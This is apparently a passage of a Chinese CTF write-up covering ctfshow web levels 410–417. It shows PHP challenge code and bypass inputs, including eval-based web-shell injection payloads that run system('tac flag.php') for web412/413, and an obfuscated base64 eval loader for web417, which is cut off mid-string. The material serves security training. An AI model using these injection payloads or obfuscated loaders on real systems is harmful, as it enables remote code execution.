<p>过滤器又换了，针对<code>FILTER_VALIDATE_BOOLEAN</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Returns true for &quot;1&quot;, &quot;true&quot;, &quot;on&quot; and &quot;yes&quot;. Returns false otherwise.</span><br><span class="line"></span><br><span class="line">If FILTER_NULL_ON_FAILURE is set, false is returned only for &quot;0&quot;, &quot;false&quot;, &quot;off&quot;, &quot;no&quot;, and &quot;&quot;, and null is returned for all non-boolean values.</span><br></pre></td></tr></table></figure>

<p>简单题直接<code>yes</code></p>
</li>
<li><p>web411 特定函数绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 13:12:41</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span> ||<span class="variable">$b</span>==<span class="string">&#x27;on&#x27;</span> || <span class="variable">$b</span>==<span class="string">&#x27;ON&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一样的<code>yes</code></p>
</li>
<li><p>web412 语法绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;//&#x27;</span>.<span class="variable">$ctfshow</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure>

<p>这里会追加<code>//xxx</code>内容到flag.php中，并且最后包含进来</p>
<p>这里仍然用到php闭合标签来使得<code>//</code>不会影响后面代码的执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=?&gt;&lt;?php eval($_POST[1]); ?&gt;&amp;1=system(&#x27;tac flag.php&#x27;);</span><br></pre></td></tr></table></figure></li>
<li><p>web413 语法绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;/*&#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;*/&#x27;</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure>

<p>这里需要将注释符闭合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=*/@eval($_POST[1]);?&gt;/*&amp;1=system(&#x27;tac flag.php&#x27;);</span><br></pre></td></tr></table></figure></li>
<li><p>web414 语法绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:43:53</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>==<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sqrt</span>(<span class="variable">$ctfshow</span>)&gt;=<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$flag</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure>

<p>首先第一个if判断存在弱类型比较，而第二个判断由于flag非数字，并且以字母开头，所以直接就是0，输入任何一个正数会进入if，所以应该输入一个负数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqrt()</span><br><span class="line">返回 num 的平方根，负数时返回 NAN</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=-1</span><br></pre></td></tr></table></figure></li>
<li><p>web415 语法绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 19:15:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$k</span> = <span class="variable">$_GET</span>[k];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;getflag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$k</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我这里加了一个命名空间<code>\getflag</code>来绕过</p>
<p>实际上，函数名、方法名、类名是不区分大小写的，因此大小写也是可以绕过的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\getflag</span><br><span class="line">GEtflag</span><br></pre></td></tr></table></figure></li>
<li><p>web416 语法绕过</p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 19:54:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;fake flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span> <span class="keyword">extends</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="variable">$_GET</span>[f]);</span><br></pre></td></tr></table></figure>

<p>show类实例化时触发构造函数，其中会调用<code>call_user_func</code>，我们看到show类是继承于ctf类的，根据官方文档</p>
<img src="/2022/11/25/ctfshow-%E5%85%B6%E4%BB%96/image-20221120003859705.png" alt="image-20221120003859705" style="zoom:50%;">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parent::flag</span><br></pre></td></tr></table></figure></li>
<li><p>web417 想想办法</p>
<p>题目给了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/*ctfshow*/</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;aPeKTP0126&#x27;</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cIYMfW</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$CBhSfw</span> = <span class="variable">$cIYMfW</span>[<span class="number">3</span>] . <span class="variable">$cIYMfW</span>[<span class="number">6</span>] . <span class="variable">$cIYMfW</span>[<span class="number">33</span>] . <span class="variable">$cIYMfW</span>[<span class="number">30</span>];</span><br><span class="line"><span class="variable">$xWoIVy</span> = <span class="variable">$cIYMfW</span>[<span class="number">33</span>] . <span class="variable">$cIYMfW</span>[<span class="number">10</span>] . <span class="variable">$cIYMfW</span>[<span class="number">24</span>] . <span class="variable">$cIYMfW</span>[<span class="number">10</span>] . <span class="variable">$cIYMfW</span>[<span class="number">24</span>];</span><br><span class="line"><span class="variable">$RkEEuV</span> = <span class="variable">$xWoIVy</span>[<span class="number">0</span>] . <span class="variable">$cIYMfW</span>[<span class="number">18</span>] . <span class="variable">$cIYMfW</span>[<span class="number">3</span>] . <span class="variable">$xWoIVy</span>[<span class="number">0</span>] . <span class="variable">$xWoIVy</span>[<span class="number">1</span>] . <span class="variable">$cIYMfW</span>[<span class="number">24</span>];</span><br><span class="line"><span class="variable">$YFfKrW</span> = <span class="variable">$cIYMfW</span>[<span class="number">7</span>] . <span class="variable">$cIYMfW</span>[<span class="number">13</span>];</span><br><span class="line"><span class="variable">$CBhSfw</span> .= <span class="variable">$cIYMfW</span>[<span class="number">22</span>] . <span class="variable">$cIYMfW</span>[<span class="number">36</span>] . <span class="variable">$cIYMfW</span>[<span class="number">29</span>] . <span class="variable">$cIYMfW</span>[<span class="number">26</span>] . <span class="variable">$cIYMfW</span>[<span class="number">30</span>] . <span class="variable">$cIYMfW</span>[<span class="number">32</span>] . <span class="variable">$cIYMfW</span>[<span class="number">35</span>] . <span class="variable">$cIYMfW</span>[<span class="number">26</span>] . <span class="variable">$cIYMfW</span>[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$CBhSfw</span>(<span class="string">&quot;JGpYanRLZD0ianBRRHVrYkd3eW5abWlWek1mc0pDb0hGTnJxSUJTaGRQQXhMT0tFZ1d0dlVUZVJYYVlsY1RjUkNadW5WbWpHVUtIZUlmT2RZWHNEa1NwTVFFaXR4TnJBbHphcXdQQmJKZ0Z2V295aExOQzltb0Ryd1VWZUtvUDVoYVh4YWl1dnRGaGZtZmdRMllqQXRKVmVsZWtybWZnUTJhZ2R1eWV2M1VHRWxOV2VqblZ2aHkyOXVVaXdIWWdVa2ZpSjNSaUoyZkhKanZISjJ2WEoyZmdKaFNKZmhTSXloU0lSbVlneTVmVHdoZnVSaFNJcmhTSXdoU0lKaFNJcWhTSXVoZnVxMllnVUNZZ0xqWWdVWFlneTBZZ3kzemlKMXZISjJTaUoyelhKMmZqSjNmakozU2pKMnZUUmhmdVFoU1R5SVNqSjJSaVFjemp2U0ozVVpnR3c5WVZrSngyVW1pMWRJV2k0dXlldjNVR0VsUElVeGxIdnRlRHhLTHFCbmZJU3hsSHZ0ZUR4S0xxQm5mSUV4emp2VG9rdkpGUGY5WVZrSngyVW1pMWRJZjEwWllWa0p4MlVtaTFkQWZrMFpZVmtKeDJVbWkxZGpTazBaWVZrSngyVW1pMWRBZmswWllWa0p4MlVtaTFkalNrMDdZREVYSkRrNHZUMHV5MnRKZURoVFBJRXhsSHZ0ZUR4S0xxQm5mZ3R4bEh2dGVEeEtMcUJuZjEwWllWU3Nla3Y1eTFkbVdpNHV5MnRKZURoVFBJa3hsSHZ0ZUR4S0xxQm5mVHZ4emp2Q2VHRUJlM1E5WVZrSngyVW1pMWQzV2k0dXlldjNVR0VsUElxSVdnZHVnZVMybnU1NGxUMHV5ZXYzVUdFbFBJUWpXaTR1eWV2M1VHRWxQSWYyV2k0dXlldjNVR0VsUElRNVdpNHV5ZXYzVUdFbFBJUTJXaTR1eWV2M1VHRWxQSWZtV2k0dXlldjNVR0VsUElmaldpNHV5ZXYzVUdFbFBJZjFXaTR1eWV2M1VHRWxQSVEyV2k0dXlldjNVR0VsUElmbVdnQmh4S2tkYVh2U0ozVVpnR3dzUXVjVm5EZWd2V0VCVURzbW9QZVBSdTFIZjA1QVVxZXVTa1VkVWtjV2lxWU15SlVQdmVKbW5xWWVvMDVOUEswQWllY1F2dVV1ZmhVY3l1dG9naGVQTERZdGVXdlJVUDVQUjFVRFVxQlRvMWNzeUsxMG9WU2RKaHR0blB3MXlJa21SaFNwU0pjUG5oWVJVSng0TGtTREpLNXZma2NRZUpKQXhlZUJmZXZUZWhVaVVreG9TaHhlRnFldW51WVZQaFVzb2hmbWlLaHVmVGhzVUp2ZHhWUkFSdWhVZnVVM2d1Um1vSjhqZVRZVWUzeGJpR3M0YTBjNVNWQkpldTRqeUtkMVNxQkNKS2N0dmhZZVVleFNuMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoQWdQaHBMMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoSWl1ZXplMlNEZmV0VG9QQklpdXRYUjFlUXZUdmlvUHhwZTFMMWllU0JQVFNmdnFrSWl1ZXplMlNEZmV0VG9QQm1pMVNwU2pRY2FnZC9OVG0vTFZ0bVFWdmhVS2haVWl3R0ZQdnRvMlUzZkNxalNITGR5ZUVoaTF2UmZDcWpTSHU3WXExc0ZreGhSVDExTEtBdVVQU2JVVkpzUUhKMnZncWhTMHFoU1RRaGZ1eWhTdVJoU1RxMVlnZUNZZ0wyWWdMMGZYSjJ6Z1E0WWdZcVlnTG1ZZ0w0WWdMMVlnTEFZZ0w1WWdZRVNISjJSakozZkhKMlJISjJTWEoyU0l1aFNKeWhTVEpoU1R3aFNUZmhTSWZoU0lMaFN1eTBZZ1lYWWd5MmZJTGhTdXFIYWdkdVUyMUhna3Z1Tml2U29EdFdVSlluZjEwWllxMXNGa3hoUmhkMldpNHVnUHQ0ZTJlWFBJZklXaTR1Z1B0NGUyZVhQSWZtV2dkdUZLZXFnVmNvTml2U29EdFdVSlluZklTeGxIdlNvRHRXVUpZbmZnRXhsSHZTb0R0V1VKWW5mVHZ4bEh2U29EdFdVSlluZmdFeGxIdlNvRHRXVUpZbmZUdnh6anZkaWVjREowdTlZRGNodnFBTVBoZG1XaTR1Z1B0NGUyZVhQSXE0V2k0dWdQdDRlMmVYUElTeGxIdjZVSnZmb2hjbmZrMFpZRGNodnFBTVBoZEFXaTR1Z1B0NGUyZVhQSVEwV2dkdXZHZUF5V2VvTml2U29EdFdVSlluUzEwWllxMXNGa3hoUmhkQWYxMDdZVnhCeXVBSlVYNDlZcTFzRmt4aFJoZGpmaDBaWXExc0ZreGhSaGRJU2gwWllxMXNGa3hoUmhkanplMFpZcTFzRmt4aFJoZGpTaDBaWXExc0ZreGhSaGRJZmswWllxMXNGa3hoUmhkSWZoMFpZcTFzRmt4aFJoZElTZTBaWXExc0ZreGhSaGRqU2gwWllxMXNGa3hoUmhkSWZrMDdVV1V0blh3dVUyMUhna3Z1YVhZYXZnZTN5aHhtaVBTSmZWaHZvMFUzZWVlNG9LZVBnSzVUbzNFMlB1ZWlma2hwVWtjdWYwNXNQS0FveWVlVmVoZUhvMWNJeWVVYUZWZXB4cXZIZTFVUnlKeG1Ta3hRZXU5dW8xVXl5Z0VzZ2hTUEp1dnRlSWtsVWV4b2Vra3lnaGt1dld2Z1BURXNpaGNQZWhjSHZ1eUlKSzVYZmV2V29rdEp2R0VNUHV0c1NLU2VpR1lUbmdoa0poSjFmaFJqaWh4SG5WdFF5UDFWeDFlTW5rVUh2UHZxZUNTVlJ1MVFMcUJvbmhZUnkxVW1MZWtlTGt2dXYydnNKMUo1b2VZcG5xMXVvMXMwVXFlVmdrdkJndVNnb0lrWEplZW1lVnZEVWtTSFBrWWtQZVVvZWVVa3hxOVVmMVlZZ2dZa2ZoaGVucVlpZTN2YWVLZDVGa3hCTHFZSGVoY015VEUwaUt2SlBLdFRlSjVYeVBCaXZrY0JMa3ZTdmhVQWVXY1huZVJBZ3V2b25XcjBVcVVQSlZlUUpLMXRuZ0UzVVAxVm5lVWtndTVnZUtSMEpJU1ZlZVJtVTNoVWZLQURKUEI0Z2VZWnZoZVduV3Z6VXFlVm9WU1BKVEV0b0llMnlUa2F4VnZrSkt0UG5rWUFQaEoxSnExRHZoeFNlMGNESjFlNFIyWURTZ1NXdjBVUVBnWWRpUFlaZWdZVWV1Y3NlaHhtdmVVQlVEa2Vua2NaeVBCaW5ra1dMcWV2RmhjUmVreGtmS2twSkdrSmYwVXR5UEJWeGtTeVVWNW9lSWVTZTF0YXllVVFKR2tKbmdoMnloZWRKcTFrUHVTdWZoY2xKUGQ1b2VTRGZEeGhuSlVCZXVlemllU2VGQ1lIaVZ3bUpleDRpa2g2UlRlaWZLOGpKMjFVU2VZa3hxY2lvM3cxZTJjUHZlU3FpV3hKZjBVWGdKdG1TaHhNb2tFVGVKc0lQSzVkUjA5V1B1OVNmSllTVWVlcFNlY3B4cWNKaWtjRFBLQlZlS2VwZmVjSmYwVUNlcXRvbnExcGVXdGlvMm1BVXFVRUZlWWRuVkFIbkttalVlZWR4aFVQUksxV3ZWdmd5aHRpUGVjeVUzeFd2Z3YzSklrdWYxeUFuVjlvZXE1TUpQQUVGcTFxVWtTSGUyQW1KS0FtUmh4RGVUdlN2VkF2Z2dyNWZrU3FnVGV0aURFTmUxSjVGa2tlRnExb2VxYzJQUDFWRmt1bWl1aGdlS3ZieTJBZXgyZWR2R2V1ZlBtMWdQNVRmMWVCZmdFZXZlYzFlQ1NpaWVjcGdLOVVmUHRWZXV4U0ZxOXlpdTVTZTA1aWVna29mMUpqZ2h2aGVWdmd5aHhwU0poTXhWQXVuSlVJaTBTVGwxRWN5M2VhdjJ2MFBQQjRlZWNDVTJCaG5lVWtlcXhteUpCQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRpMmNZTHFBQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRncVNpdjJ2eXZLdHVlSzltZ3FTaUwxU1BMcXRlZlZCYml1S